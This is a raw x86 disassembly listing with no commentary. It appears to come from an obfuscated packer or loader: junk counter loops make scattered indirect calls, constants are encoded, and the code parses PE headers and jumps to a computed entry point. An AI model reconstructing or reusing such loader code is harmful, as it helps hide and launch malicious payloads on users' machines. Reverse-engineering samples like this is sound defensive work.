  4055d1:	mov    DWORD PTR ds:0x4275a8,0x6b2
  4055db:	xor    eax,esi
  4055dd:	add    eax,ebx
  4055df:	mov    DWORD PTR ds:0x4292d1,0x50ae
  4055e9:	cmp    edx,eax
  4055eb:	mov    DWORD PTR ds:0x4292d1,0x1218
  4055f5:	jne    0x405ffd
  4055fb:	and    DWORD PTR ds:0x427d17,0x0
  405605:	mov    eax,ds:0x427d17
  40560a:	inc    eax
  40560b:	mov    ds:0x427d17,eax
  405610:	cmp    DWORD PTR ds:0x427d17,0x7
  405617:	jne    0x40562d
  40561d:	push   0x4275e0
  405622:	push   0x400000
  405627:	call   DWORD PTR ds:0x427aa7
  40562d:	cmp    DWORD PTR ds:0x427d17,0x6
  405634:	jne    0x405645
  40563a:	mov    eax,ds:0x427d17
  40563f:	inc    eax
  405640:	mov    ds:0x427d17,eax
  405645:	cmp    DWORD PTR ds:0x427d17,0x15
  40564c:	jb     0x405605
  405652:	mov    eax,DWORD PTR [ebp-0x18]
  405655:	mov    DWORD PTR [ebp-0x30],eax
  405658:	and    DWORD PTR ds:0x4275ac,0x0
  405662:	jmp    0x405672
  405667:	mov    eax,ds:0x4275ac
  40566c:	inc    eax
  40566d:	mov    ds:0x4275ac,eax
  405672:	cmp    DWORD PTR ds:0x4275ac,0x12
  405679:	jae    0x40570b
  40567f:	cmp    DWORD PTR ds:0x4275ac,0x5
  405686:	jne    0x40569c
  40568c:	push   0x8a4f
  405691:	push   0x1ced
  405696:	call   DWORD PTR ds:0x427aab
  40569c:	cmp    DWORD PTR ds:0x4275ac,0x4
  4056a3:	jne    0x4056b7
  4056a9:	xor    eax,eax
  4056ab:	xor    eax,DWORD PTR ds:0x4275ac
  4056b1:	inc    eax
  4056b2:	mov    ds:0x4275ac,eax
  4056b7:	jmp    0x405667
  4056bc:	mov    DWORD PTR ds:0x4275a8,0x1a
  4056c6:	cmp    DWORD PTR ds:0x4275a8,0x0
  4056cd:	je     0x40570b
  4056d3:	cmp    DWORD PTR ds:0x4275a8,0x24
  4056da:	jne    0x4056f5
  4056e0:	push   0x8e07
  4056e5:	push   0x4292a5
  4056ea:	push   0x400000
  4056ef:	call   DWORD PTR ds:0x4279db
  4056f5:	mov    eax,ds:0x4275a8
  4056fa:	dec    eax
  4056fb:	mov    ds:0x4275a8,eax
  405700:	jmp    0x4056c6
  405705:	neg    DWORD PTR ds:0x42c89e
  40570b:	mov    eax,DWORD PTR [ebp-0x20]
  40570e:	add    edx,0x3568
  405714:	mov    DWORD PTR [ebp-0x1c],eax
  405717:	xor    eax,eax
  405719:	add    eax,DWORD PTR ds:0x4278bb
  40571f:	mov    edi,DWORD PTR ds:0x4278bf
  405725:	sub    eax,edi
  405727:	add    eax,DWORD PTR [eax+edi*1]
  40572a:	mov    eax,ds:0x4091a0
  40572f:	or     DWORD PTR ds:0x427d1f,ecx
  405735:	mov    eax,DWORD PTR [eax+0x198]
  40573b:	sub    edx,DWORD PTR ds:0x4292b5
  405741:	mov    DWORD PTR [ebp-0xc],eax
  405744:	mov    eax,DWORD PTR [ebp-0x1c]
  405747:	mov    edx,DWORD PTR [ebp-0xc]
  40574a:	or     DWORD PTR ds:0x427594,ebx
  405750:	xor    eax,esi
  405752:	sbb    edi,0x2806
  405758:	add    eax,ebx
  40575a:	xor    edi,0x222f
  405760:	mov    DWORD PTR [edx],eax
  405762:	and    DWORD PTR ds:0x42c89e,0x0
  40576c:	jmp    0x40577e
  405771:	mov    edx,DWORD PTR ds:0x42c89e
  405777:	inc    edx
  405778:	mov    DWORD PTR ds:0x42c89e,edx
  40577e:	cmp    DWORD PTR ds:0x42c89e,0x1b
  405785:	jae    0x4057c4
  40578b:	cmp    DWORD PTR ds:0x42c89e,0x4
  405792:	jne    0x4057a3
  405798:	push   0x755f
  40579d:	call   DWORD PTR ds:0x4279df
  4057a3:	cmp    DWORD PTR ds:0x42c89e,0x3
  4057aa:	jne    0x4057bf
  4057b0:	xor    edx,edx
  4057b2:	or     edx,DWORD PTR ds:0x42c89e
  4057b8:	inc    edx
  4057b9:	mov    DWORD PTR ds:0x42c89e,edx
  4057bf:	jmp    0x405771
  4057c4:	lea    eax,[ebp-0x14]
  4057c7:	mov    DWORD PTR [ebp-0x44],eax
  4057ca:	and    DWORD PTR ds:0x4275a4,0x0
  4057d4:	jmp    0x4057e6
  4057d9:	mov    edx,DWORD PTR ds:0x4275a4
  4057df:	inc    edx
  4057e0:	mov    DWORD PTR ds:0x4275a4,edx
  4057e6:	cmp    DWORD PTR ds:0x4275a4,0x1c
  4057ed:	jae    0x40582a
  4057f3:	cmp    DWORD PTR ds:0x4275a4,0x11
  4057fa:	jne    0x40580b
  405800:	push   0x864b
  405805:	call   DWORD PTR ds:0x4279e3
  40580b:	cmp    DWORD PTR ds:0x4275a4,0x10
  405812:	jne    0x405825
  405818:	mov    edx,DWORD PTR ds:0x4275a4
  40581e:	inc    edx
  40581f:	mov    DWORD PTR ds:0x4275a4,edx
  405825:	jmp    0x4057d9
  40582a:	mov    eax,DWORD PTR [ebp-0x1c]
  40582d:	mov    edx,DWORD PTR [ebp-0x44]
  405830:	xor    eax,esi
  405832:	or     DWORD PTR ds:0x4275a0,edx
  405838:	add    eax,ebx
  40583a:	adc    DWORD PTR ds:0x4275a4,0x37fa
  405844:	mov    DWORD PTR [edx],eax
  405846:	and    DWORD PTR ds:0x4292c9,edi
  40584c:	mov    DWORD PTR [ebp-0x54],ecx
  40584f:	lea    eax,[ebp-0x54]
  405852:	or     edi,edi
  405854:	mov    DWORD PTR [ebp-0x10],eax
  405857:	mov    edi,DWORD PTR ds:0x4292b1
  40585d:	or     edi,DWORD PTR ds:0x4275a8
  405863:	mov    DWORD PTR ds:0x4292b1,edi
  405869:	mov    eax,DWORD PTR [ebp-0x54]
  40586c:	mov    DWORD PTR ds:0x4292a1,0x1d
  405876:	cmp    DWORD PTR ds:0x4292a1,0x0
  40587d:	je     0x4058ca
  405883:	cmp    DWORD PTR ds:0x4292a1,0xb
  40588a:	jne    0x40589c
  405890:	push   DWORD PTR [ebp-0x24]
  405893:	push   DWORD PTR [ebp-0x14]
  405896:	call   DWORD PTR ds:0x427aaf
  40589c:	cmp    DWORD PTR ds:0x4292a1,0xc
  4058a3:	jne    0x4058b6
  4058a9:	mov    ecx,DWORD PTR ds:0x4292a1
  4058af:	dec    ecx
  4058b0:	mov    DWORD PTR ds:0x4292a1,ecx
  4058b6:	xor    ecx,ecx
  4058b8:	xor    ecx,DWORD PTR ds:0x4292a1
  4058be:	dec    ecx
  4058bf:	mov    DWORD PTR ds:0x4292a1,ecx
  4058c5:	jmp    0x405876
  4058ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4058cd:	or     DWORD PTR ds:0x427d0f,0x2cf9
  4058d7:	xor    eax,esi
  4058d9:	mov    edi,DWORD PTR ds:0x427d07
  4058df:	or     DWORD PTR ds:0x4292b9,edi
  4058e5:	add    eax,0x32729e
  4058ea:	mov    DWORD PTR [ecx],eax
  4058ec:	sub    edi,edi
  4058ee:	mov    eax,ds:0x409274
  4058f3:	sbb    DWORD PTR ds:0x42c882,0x4292dd
  4058fd:	mov    DWORD PTR [ebp-0x28],0x8e12febe
  405904:	sbb    DWORD PTR ds:0x427d0f,0x4292d5
  40590e:	mov    eax,DWORD PTR [eax]
  405910:	mov    cx,WORD PTR [ebp-0x14]
  405914:	movzx  edi,WORD PTR ds:0x4292dd
  40591b:	and    DWORD PTR ds:0x4292d9,edi
  405921:	movzx  ecx,cx
  405924:	add    DWORD PTR ds:0x4275b0,0x4292b5
  40592e:	add    ecx,DWORD PTR [eax]
  405930:	or     edi,edi
  405932:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  405939:	mov    DWORD PTR [ebp-0x10],ecx
  40593c:	sub    ecx,DWORD PTR ds:0x4292c1
  405942:	mov    edi,0x5a3fc9e
  405947:	mov    eax,DWORD PTR [ebp-0x1c]
  40594a:	mov    DWORD PTR ds:0x427d1b,0x10
  405954:	cmp    DWORD PTR ds:0x427d1b,0x0
  40595b:	je     0x4059b1
  405961:	cmp    DWORD PTR ds:0x427d1b,0x6
  405968:	jne    0x405983
  40596e:	push   0x1942
  405973:	push   0x427d03
  405978:	push   0x427644
  40597d:	call   DWORD PTR ds:0x427ab3
  405983:	cmp    DWORD PTR ds:0x427d1b,0x7
  40598a:	jne    0x40599f
  405990:	xor    ecx,ecx
  405992:	xor    ecx,DWORD PTR ds:0x427d1b
  405998:	dec    ecx
  405999:	mov    DWORD PTR ds:0x427d1b,ecx
  40599f:	mov    ecx,DWORD PTR ds:0x427d1b
  4059a5:	dec    ecx
  4059a6:	mov    DWORD PTR ds:0x427d1b,ecx
  4059ac:	jmp    0x405954
  4059b1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059b4:	xor    eax,esi
  4059b6:	or     DWORD PTR ds:0x4292cd,0x78e6
  4059c0:	add    eax,ebx
  4059c2:	mov    DWORD PTR ds:0x4292b1,0x5c9d
  4059cc:	cmp    DWORD PTR [ecx],eax
  4059ce:	jne    0x405c08
  4059d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4059d7:	xor    ecx,DWORD PTR ds:0x4292c1
  4059dd:	mov    ecx,DWORD PTR [ebp-0x10]
  4059e0:	xor    eax,esi
  4059e2:	add    eax,ebx
  4059e4:	mov    DWORD PTR ds:0x4275a4,0x5c09
  4059ee:	cmp    DWORD PTR [ecx],eax
  4059f0:	mov    DWORD PTR ds:0x4275b0,0x35e5
  4059fa:	jne    0x405ad7
  405a00:	mov    eax,DWORD PTR [ebp-0x1c]
  405a03:	mov    ecx,DWORD PTR [ebp-0x44]
  405a06:	xor    eax,esi
  405a08:	add    eax,ebx
  405a0a:	mov    DWORD PTR [ecx],eax
  405a0c:	and    DWORD PTR ds:0x42c886,0x0
  405a16:	jmp    0x405a28
  405a1b:	mov    edx,DWORD PTR ds:0x42c886
  405a21:	inc    edx
  405a22:	mov    DWORD PTR ds:0x42c886,edx
  405a28:	cmp    DWORD PTR ds:0x42c886,0x1e
  405a2f:	jae    0x405ab0
  405a35:	cmp    DWORD PTR ds:0x42c886,0x2b
  405a3c:	jne    0x405a4d
  405a42:	push   0x2523
  405a47:	call   DWORD PTR ds:0x427ab7
  405a4d:	jmp    0x405a1b
  405a52:	and    DWORD PTR ds:0x4292b5,0x0
  405a5c:	xor    edx,edx
  405a5e:	xor    edx,DWORD PTR ds:0x4292b5
  405a64:	inc    edx
  405a65:	mov    DWORD PTR ds:0x4292b5,edx
  405a6b:	cmp    DWORD PTR ds:0x4292b5,0xe
  405a72:	jne    0x405a83
  405a78:	push   0x3988
  405a7d:	call   DWORD PTR ds:0x4279e7
  405a83:	cmp    DWORD PTR ds:0x4292b5,0xd
  405a8a:	jne    0x405a9d
  405a90:	mov    edx,DWORD PTR ds:0x4292b5
  405a96:	inc    edx
  405a97:	mov    DWORD PTR ds:0x4292b5,edx
  405a9d:	cmp    DWORD PTR ds:0x4292b5,0x19
  405aa4:	jb     0x405a5c
  405aaa:	sbb    DWORD PTR ds:0x4292c9,ebx
  405ab0:	mov    eax,DWORD PTR [ebp-0x44]
  405ab3:	mov    ecx,DWORD PTR [ebp-0x34]
  405ab6:	xor    ecx,esi
  405ab8:	sub    edx,DWORD PTR ds:0x4292ad
  405abe:	mov    edx,0xffcd8d62
  405ac3:	sub    DWORD PTR ds:0x427cf7,0x427d0f
  405acd:	sub    edx,ecx
  405acf:	not    DWORD PTR ds:0x4292ad
  405ad5:	add    DWORD PTR [eax],edx
  405ad7:	and    DWORD PTR ds:0x4292ad,0x0
  405ae1:	mov    eax,ds:0x4292ad
  405ae6:	inc    eax
  405ae7:	mov    ds:0x4292ad,eax
  405aec:	cmp    DWORD PTR ds:0x4292ad,0x26
  405af3:	jne    0x405b19
  405af9:	push   DWORD PTR [ebp-0x28]
  405afc:	push   0x26cd
  405b01:	push   0x51bd
  405b06:	push   0x1327
  405b0b:	push   0x7353
  405b10:	push   DWORD PTR [ebp-0x1c]
  405b13:	call   DWORD PTR ds:0x4279eb
  405b19:	cmp    DWORD PTR ds:0x4292ad,0x16
  405b20:	jb     0x405ae1
  405b26:	mov    eax,ds:0x409274
  405b2b:	mov    eax,DWORD PTR [eax]
  405b2d:	mov    cx,WORD PTR [ebp-0x14]
  405b31:	movzx  ecx,cx
  405b34:	adc    DWORD PTR ds:0x4292a9,0x4292d1
  405b3e:	add    ecx,DWORD PTR [eax]
  405b40:	mov    DWORD PTR [ebp-0x10],ecx
  405b43:	mov    eax,ds:0x42c892
  405b48:	adc    DWORD PTR ds:0x42c89a,eax
  405b4e:	mov    eax,DWORD PTR [ebp-0x30]
  405b51:	sbb    ecx,DWORD PTR ds:0x4292b9
  405b57:	mov    ecx,DWORD PTR [ebp-0x30]
  405b5a:	or     DWORD PTR ds:0x42c88a,0x6b1f
  405b64:	xor    eax,esi
  405b66:	lea    eax,[eax+eax*1+0x32729e]
  405b6d:	adc    DWORD PTR ds:0x42759c,0x427d07
  405b77:	xor    ecx,esi
  405b79:	sub    ecx,eax
  405b7b:	mov    DWORD PTR ds:0x4275b0,0x4a7
  405b85:	mov    ax,WORD PTR [ebp-0x14]
  405b89:	mov    DWORD PTR ds:0x42c88e,0x21d5
  405b93:	movzx  eax,ax
  405b96:	mov    DWORD PTR ds:0x4292b9,0x441f
  405ba0:	cmp    eax,ecx
  405ba2:	mov    ecx,0x2c38
  405ba7:	mov    eax,DWORD PTR [ebp-0x34]
  405baa:	movzx  ecx,WORD PTR [ebp-0x14]
  405bae:	jg     0x405beb
  405bb4:	or     DWORD PTR ds:0x42c88e,0x6341
  405bbe:	xor    eax,esi
  405bc0:	sbb    DWORD PTR ds:0x427d13,0x4292bd
  405bca:	sub    ecx,eax
  405bcc:	sbb    DWORD PTR ds:0x4292a9,0x68
  405bd6:	sub    ecx,ebx
  405bd8:	mov    DWORD PTR ds:0x4292b5,0x7dde
  405be2:	mov    WORD PTR [ebp-0x14],cx
  405be6:	jmp    0x405c08
  405beb:	xor    eax,esi
  405bed:	mov    DWORD PTR ds:0x4292c1,0x28f0
  405bf7:	lea    eax,[eax+ecx*1+0x32729e]
  405bfe:	mov    DWORD PTR ds:0x4275a4,ecx
  405c04:	mov    WORD PTR [ebp-0x14],ax
  405c08:	mov    ecx,DWORD PTR [ebp-0x28]
  405c0b:	mov    eax,ds:0x427594
  405c10:	mov    eax,0x8e12febe
  405c15:	cmp    ecx,eax
  405c17:	je     0x405c41
  405c1d:	not    eax
  405c1f:	mov    eax,DWORD PTR [ebp-0xc]
  405c22:	mov    DWORD PTR ds:0x427598,0x90
  405c2c:	mov    DWORD PTR [eax],0x60341e8d
  405c32:	mov    DWORD PTR ds:0x427cfb,0xcef
  405c3c:	jmp    0x405fec
  405c41:	mov    DWORD PTR ds:0x427cfb,ecx
  405c47:	mov    ecx,DWORD PTR [ebp-0x28]
  405c4a:	mov    DWORD PTR ds:0x4275a8,0x60ce
  405c54:	cmp    ecx,0x5142ddbc
  405c5a:	mov    DWORD PTR ds:0x4292d5,0x22e7
  405c64:	jne    0x405dd1
  405c6a:	not    eax
  405c6c:	mov    eax,DWORD PTR [ebp-0xc]
  405c6f:	mov    DWORD PTR [eax],0x4214febc
  405c75:	mov    eax,DWORD PTR [ebp-0xc]
  405c78:	mov    DWORD PTR ds:0x42c89e,0x9bc
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	mov    eax,DWORD PTR [ebp-0x30]
  405c88:	mov    DWORD PTR ds:0x4292bd,ebx
  405c8e:	mov    eax,DWORD PTR [ebp-0x1c]
  405c91:	mov    eax,0x59e1
  405c96:	mov    DWORD PTR [ebp-0x4c],edi
  405c99:	mov    eax,DWORD PTR [ebp-0x4c]
  405c9c:	mov    DWORD PTR ds:0x4292d1,0x6603
  405ca6:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405cad:	mov    DWORD PTR ds:0x42c89e,0x4b8d
  405cb7:	cmp    eax,edi
  405cb9:	jne    0x405fec
  405cbf:	mov    ax,WORD PTR [ebp-0x8]
  405cc3:	and    DWORD PTR ds:0x4292c9,0x0
  405ccd:	mov    ecx,DWORD PTR ds:0x4292c9
  405cd3:	inc    ecx
  405cd4:	mov    DWORD PTR ds:0x4292c9,ecx
  405cda:	cmp    DWORD PTR ds:0x4292c9,0x7
  405ce1:	jne    0x405d0a
  405ce7:	push   0x3aec
  405cec:	push   0x6e2f
  405cf1:	push   0x3209
  405cf6:	push   0x4292c9
  405cfb:	push   DWORD PTR [ebp-0x20]
  405cfe:	push   DWORD PTR [ebp-0x28]
  405d01:	push   DWORD PTR [ebp-0x14]
  405d04:	call   DWORD PTR ds:0x427abb
  405d0a:	cmp    DWORD PTR ds:0x4292c9,0x6
  405d11:	jne    0x405d24
  405d17:	mov    ecx,DWORD PTR ds:0x4292c9
  405d1d:	inc    ecx
  405d1e:	mov    DWORD PTR ds:0x4292c9,ecx
  405d24:	cmp    DWORD PTR ds:0x4292c9,0x1a
  405d2b:	jb     0x405ccd
  405d31:	mov    ecx,0x8a42
  405d36:	and    DWORD PTR ds:0x427598,0x7f75
  405d40:	xor    ax,cx
  405d43:	mov    ecx,DWORD PTR ds:0x427594
  405d49:	xor    DWORD PTR ds:0x4292c9,ecx
  405d4f:	mov    ecx,0x3b08
  405d54:	add    ax,cx
  405d57:	mov    ecx,DWORD PTR [ebp-0x4]
  405d5a:	movzx  eax,ax
  405d5d:	sub    DWORD PTR ds:0x4292dd,0x42c892
  405d67:	not    eax
  405d69:	add    DWORD PTR ds:0x42c88a,0x427d03
  405d73:	and    eax,DWORD PTR [ecx]
  405d75:	mov    DWORD PTR ds:0x42c886,0x6891
  405d7f:	mov    ecx,DWORD PTR [ebp-0x4]
  405d82:	mov    DWORD PTR ds:0x4275ac,0x5963
  405d8c:	mov    DWORD PTR [ecx],eax
  405d8e:	jmp    0x405d9a
  405d93:	xor    DWORD PTR [ebp-0x4c],0xe149ebe
  405d9a:	xor    DWORD PTR ds:0x427d1b,0x1156
  405da4:	mov    ax,WORD PTR [ebp-0x8]
  405da8:	push   DWORD PTR [ebp-0x4]
  405dab:	call   0x401000
  405db0:	test   eax,eax
  405db2:	mov    DWORD PTR ds:0x4292d9,0x68ee
  405dbc:	je     0x405d93
  405dc2:	mov    DWORD PTR ds:0x4292b1,0x2e0e
  405dcc:	jmp    0x405fec
  405dd1:	mov    ecx,DWORD PTR [ebp-0x28]
  405dd4:	cmp    ecx,0x1443fcbd
  405dda:	mov    DWORD PTR ds:0x427598,0x1afd
  405de4:	jne    0x405e02
  405dea:	mov    eax,DWORD PTR [ebp-0xc]
  405ded:	mov    DWORD PTR ds:0x4292b9,0x35a9
  405df7:	mov    DWORD PTR [eax],0x60062d8f
  405dfd:	jmp    0x405fec
  405e02:	mov    ecx,DWORD PTR [ebp-0x28]
  405e05:	cmp    ecx,eax
  405e07:	mov    DWORD PTR ds:0x42c88a,0x2673
  405e11:	jne    0x405f71
  405e17:	and    DWORD PTR ds:0x427cff,0x0
  405e21:	xor    eax,eax
  405e23:	or     eax,DWORD PTR ds:0x427cff
  405e29:	inc    eax
  405e2a:	mov    ds:0x427cff,eax
  405e2f:	cmp    DWORD PTR ds:0x427cff,0xc
  405e36:	jne    0x405e47
  405e3c:	push   0x4d1d
  405e41:	call   DWORD PTR ds:0x427abf
  405e47:	cmp    DWORD PTR ds:0x427cff,0xb
  405e4e:	jne    0x405e62
  405e54:	xor    eax,eax
  405e56:	or     eax,DWORD PTR ds:0x427cff
  405e5c:	inc    eax
  405e5d:	mov    ds:0x427cff,eax
  405e62:	cmp    DWORD PTR ds:0x427cff,0x1f
  405e69:	jb     0x405e21
  405e6f:	mov    eax,DWORD PTR [ebp-0x1c]
  405e72:	mov    ecx,DWORD PTR [ebp-0xc]
  405e75:	xor    eax,esi
  405e77:	add    eax,ebx
  405e79:	cmp    DWORD PTR [ecx],eax
  405e7b:	je     0x405efe
  405e81:	mov    ecx,DWORD PTR [ebp-0x54]
  405e84:	mov    eax,DWORD PTR [ebp-0xc]
  405e87:	mov    eax,DWORD PTR [eax]
  405e89:	mov    eax,DWORD PTR [eax+0x3c]
  405e8c:	lea    ecx,[ecx*8+0x78]
  405e93:	add    eax,ecx
  405e95:	mov    ecx,DWORD PTR [ebp-0xc]
  405e98:	mov    ecx,DWORD PTR [ecx]
  405e9a:	mov    eax,DWORD PTR [eax+ecx*1]
  405e9d:	mov    DWORD PTR [ebp-0x8],eax
  405ea0:	mov    eax,DWORD PTR [ebp-0x1c]
  405ea3:	xor    eax,esi
  405ea5:	add    eax,ebx
  405ea7:	mov    DWORD PTR [ebp-0x4],eax
  405eaa:	mov    eax,DWORD PTR [ebp-0x1c]
  405ead:	mov    ecx,DWORD PTR [ebp-0x8]
  405eb0:	xor    eax,esi
  405eb2:	add    eax,ebx
  405eb4:	cmp    ecx,eax
  405eb6:	je     0x405fec
  405ebc:	mov    eax,DWORD PTR [ebp-0xc]
  405ebf:	mov    ecx,DWORD PTR [ebp-0x8]
  405ec2:	add    ecx,DWORD PTR [eax]
  405ec4:	mov    DWORD PTR [ebp-0x4],ecx
  405ec7:	mov    eax,DWORD PTR [ebp-0x4]
  405eca:	mov    ecx,DWORD PTR [ebp-0xc]
  405ecd:	mov    eax,DWORD PTR [eax+0xc]
  405ed0:	mov    ecx,DWORD PTR [ecx]
  405ed2:	mov    al,BYTE PTR [eax+ecx*1]
  405ed5:	add    al,0x35
  405ed7:	xor    al,0x49
  405ed9:	cmp    al,0xc9
  405edb:	je     0x405ef2
  405ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  405ee4:	mov    ecx,DWORD PTR [ebp-0xc]
  405ee7:	xor    eax,esi
  405ee9:	add    eax,ebx
  405eeb:	mov    DWORD PTR [ecx],eax
  405eed:	jmp    0x405fec
  405ef2:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  405ef9:	jmp    0x405fec
  405efe:	mov    eax,DWORD PTR [ebp-0xc]
  405f01:	mov    ecx,DWORD PTR [ebp-0x10]
  405f04:	mov    ecx,DWORD PTR [ecx]
  405f06:	mov    DWORD PTR [eax],ecx
  405f08:	mov    eax,DWORD PTR [ebp-0xc]
  405f0b:	mov    DWORD PTR [ebp-0x4],eax
  405f0e:	mov    eax,DWORD PTR [ebp-0x30]
  405f11:	mov    eax,DWORD PTR [ebp-0x1c]
  405f14:	mov    DWORD PTR [ebp-0x5c],edi
  405f17:	mov    eax,DWORD PTR [ebp-0x5c]
  405f1a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405f21:	cmp    eax,edi
  405f23:	jne    0x405fec
  405f29:	mov    ax,WORD PTR [ebp-0x8]
  405f2d:	mov    ecx,0x8a42
  405f32:	xor    ax,cx
  405f35:	mov    ecx,0x3b08
  405f3a:	add    ax,cx
  405f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405f40:	movzx  eax,ax
  405f43:	not    eax
  405f45:	and    eax,DWORD PTR [ecx]
  405f47:	mov    ecx,DWORD PTR [ebp-0x4]
  405f4a:	mov    DWORD PTR [ecx],eax
  405f4c:	jmp    0x405f58
  405f51:	xor    DWORD PTR [ebp-0x5c],0xe149ebe
  405f58:	mov    ax,WORD PTR [ebp-0x8]
  405f5c:	push   DWORD PTR [ebp-0x4]
  405f5f:	call   0x401000
  405f64:	test   eax,eax
  405f66:	je     0x405f51
  405f6c:	jmp    0x405fec
  405f71:	mov    eax,DWORD PTR [ebp-0x28]
  405f74:	cmp    eax,0x33450cad
  405f79:	jne    0x405fec
  405f7f:	mov    eax,DWORD PTR [ebp-0xc]
  405f82:	mov    DWORD PTR [eax],0x443dc9d
  405f88:	mov    eax,DWORD PTR [ebp-0xc]
  405f8b:	mov    DWORD PTR [ebp-0x4],eax
  405f8e:	mov    eax,DWORD PTR [ebp-0x30]
  405f91:	mov    eax,DWORD PTR [ebp-0x1c]
  405f94:	mov    DWORD PTR [ebp-0x40],edi
  405f97:	mov    eax,DWORD PTR [ebp-0x40]
  405f9a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405fa1:	cmp    eax,edi
  405fa3:	jne    0x405fec
  405fa9:	mov    ax,WORD PTR [ebp-0x8]
  405fad:	mov    ecx,0x8a42
  405fb2:	xor    ax,cx
  405fb5:	mov    ecx,0x3b08
  405fba:	add    ax,cx
  405fbd:	mov    ecx,DWORD PTR [ebp-0x4]
  405fc0:	movzx  eax,ax
  405fc3:	not    eax
  405fc5:	and    eax,DWORD PTR [ecx]
  405fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  405fca:	mov    DWORD PTR [ecx],eax
  405fcc:	jmp    0x405fd8
  405fd1:	xor    DWORD PTR [ebp-0x40],0xe149ebe
  405fd8:	mov    ax,WORD PTR [ebp-0x8]
  405fdc:	push   DWORD PTR [ebp-0x4]
  405fdf:	call   0x401000
  405fe4:	test   eax,eax
  405fe6:	je     0x405fd1
  405fec:	mov    eax,DWORD PTR [ebp-0x28]
  405fef:	cmp    eax,0x8e12febe
  405ff4:	je     0x405947
  405ffa:	mov    eax,DWORD PTR [ebp-0xc]
  405ffd:	mov    eax,ds:0x4091a0
  406002:	mov    eax,DWORD PTR [eax+0x18c]
  406008:	mov    eax,DWORD PTR [eax]
  40600a:	mov    DWORD PTR [ebp-0x74],eax
  40600d:	mov    eax,0xf89c8531
  406012:	mov    DWORD PTR [ebp-0x10],eax
  406015:	mov    DWORD PTR [ebp-0x10],eax
  406018:	mov    DWORD PTR [ebp-0x10],eax
  40601b:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  406022:	mov    DWORD PTR [ebp-0x8],eax
  406025:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  40602c:	mov    edi,DWORD PTR [ebp-0x20]
  40602f:	xor    edi,esi
  406031:	add    edi,ebx
  406033:	jmp    0x40606e
  406038:	mov    eax,DWORD PTR [ebp-0x18]
  40603b:	xor    eax,esi
  40603d:	lea    eax,[eax+edi*1+0x32729e]
  406044:	push   eax
  406045:	mov    eax,DWORD PTR [ebp-0x10]
  406048:	xor    eax,esi
  40604a:	lea    eax,[ebp+eax*1+0x3272a6]
  406051:	push   eax
  406052:	mov    eax,ds:0x4091a0
  406057:	push   DWORD PTR [eax+0x1bc]
  40605d:	call   0x402c87
  406062:	mov    eax,DWORD PTR [ebp-0x18]
  406065:	xor    eax,esi
  406067:	lea    edi,[edi+eax*1+0x32729e]
  40606e:	mov    eax,DWORD PTR [ebp-0x18]
  406071:	mov    ecx,DWORD PTR [ebp-0x18]
  406074:	xor    ecx,esi
  406076:	xor    eax,esi
  406078:	add    eax,ecx
  40607a:	mov    ecx,DWORD PTR [ebp-0x18]
  40607d:	xor    ecx,esi
  40607f:	lea    eax,[eax+ecx*1+0x9757da]
  406086:	cmp    edi,eax
  406088:	jbe    0x406038
  40608e:	mov    eax,DWORD PTR [ebp+0xc]
  406091:	mov    ds:0x409024,eax
  406096:	mov    eax,DWORD PTR [ebp+0x10]
  406099:	mov    ds:0x409278,eax
  40609e:	mov    eax,ds:0x409024
  4060a3:	mov    ecx,DWORD PTR [ebp-0x60]
  4060a6:	sub    eax,ebx
  4060a8:	xor    eax,esi
  4060aa:	mov    DWORD PTR [ecx],eax
  4060ac:	mov    eax,DWORD PTR [ebp-0x58]
  4060af:	cmp    eax,0xf89c8534
  4060b4:	je     0x406111
  4060ba:	mov    eax,DWORD PTR [ebp-0x20]
  4060bd:	mov    ecx,DWORD PTR [ebp-0x50]
  4060c0:	xor    eax,esi
  4060c2:	add    eax,ebx
  4060c4:	cmp    eax,ecx
  4060c6:	je     0x406111
  4060cc:	mov    eax,ds:0x4091a0
  4060d1:	mov    eax,DWORD PTR [eax+0x194]
  4060d7:	mov    ecx,DWORD PTR [eax]
  4060d9:	mov    eax,DWORD PTR [ecx+0x3c]
  4060dc:	push   DWORD PTR ds:0x409278
  4060e2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4060e6:	push   DWORD PTR ds:0x409024
  4060ec:	add    eax,ecx
  4060ee:	mov    ecx,DWORD PTR ds:0x4091a0
  4060f4:	mov    ecx,DWORD PTR [ecx+0x194]
  4060fa:	push   DWORD PTR [ecx]
  4060fc:	call   eax
  4060fe:	mov    ecx,DWORD PTR ds:0x4091a0
  406104:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40610a:	mov    DWORD PTR [ecx],eax
  40610c:	jmp    0x4063cb
  406111:	mov    eax,DWORD PTR [ebp-0x20]
  406114:	mov    ecx,DWORD PTR [ebp-0x74]
  406117:	xor    eax,esi
  406119:	add    eax,ebx
  40611b:	mov    edi,0xf89c85f5
  406120:	cmp    eax,ecx
  406122:	jne    0x406223
  406128:	mov    eax,DWORD PTR [ebp-0x20]
  40612b:	xor    eax,esi
  40612d:	add    eax,ebx
  40612f:	mov    ds:0x409224,eax
  406134:	mov    eax,DWORD PTR [ebp-0x20]
  406137:	xor    eax,esi
  406139:	add    eax,ebx
  40613b:	mov    ds:0x40921c,eax
  406140:	mov    eax,DWORD PTR [ebp-0x18]
  406143:	mov    DWORD PTR [ebp-0x8],eax
  406146:	mov    eax,DWORD PTR [ebp-0x20]
  406149:	mov    DWORD PTR [ebp+0xc],eax
  40614c:	mov    eax,DWORD PTR [ebp+0xc]
  40614f:	xor    eax,esi
  406151:	add    eax,ebx
  406153:	mov    DWORD PTR [ebp+0xc],eax
  406156:	mov    eax,ds:0x409020
  40615b:	mov    eax,DWORD PTR [eax]
  40615d:	mov    DWORD PTR [ebp+0xc],eax
  406160:	mov    eax,ds:0x409228
  406165:	mov    eax,DWORD PTR [eax]
  406167:	mov    DWORD PTR [ebp-0x60],eax
  40616a:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  406171:	mov    eax,DWORD PTR [ebp+0x10]
